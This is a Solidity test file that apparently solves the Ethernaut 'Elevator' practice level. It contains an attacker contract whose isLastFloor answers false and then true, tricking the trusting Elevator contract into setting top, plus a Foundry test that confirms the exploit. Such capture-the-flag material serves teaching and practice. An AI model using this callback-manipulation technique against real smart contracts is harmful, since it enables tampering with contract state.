// SPDX-License-Identifier: MIT

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Elevator, Building} from "../../src/Elevator/Level.sol";

pragma solidity ^0.6.0;

contract TheBuilding {
    bool called;

    function isLastFloor(uint) external returns (bool) {
        if (!called) {
            called = true;
            return false;
        } else {
            return true;
        }
    }

    function goTo(address elevator, uint _floor) external {
        elevator.call(abi.encodeWithSignature("goTo(uint256)", _floor));
    }
}

pragma solidity ^0.6.0;

interface IElevator {
  function goTo(uint _floor) external;

  function top() external view returns(bool);
}

contract ElevatorTest is LevelFactory {
  IElevator elevator;
  Building building;

  function setUp() public {
    vm.prank(deployer); // deploy the contract as deployer
    elevator = IElevator(address(new Elevator()));
    building = Building(address(new TheBuilding()));
  }

  function testAttack() public {
    submitLevel("Elevator");
  }

  function _performTest() internal override {
    (bool success,) = address(building).call(abi.encodeWithSignature("goTo(address,uint256)", address(elevator), 1));
    assert(success);
  }

  function _setupTest() internal override {
    vm.startPrank(attacker);
  }

  function _checkTest() internal override returns (bool) {
    assertTrue(elevator.top());

    return elevator.top();
  }
}


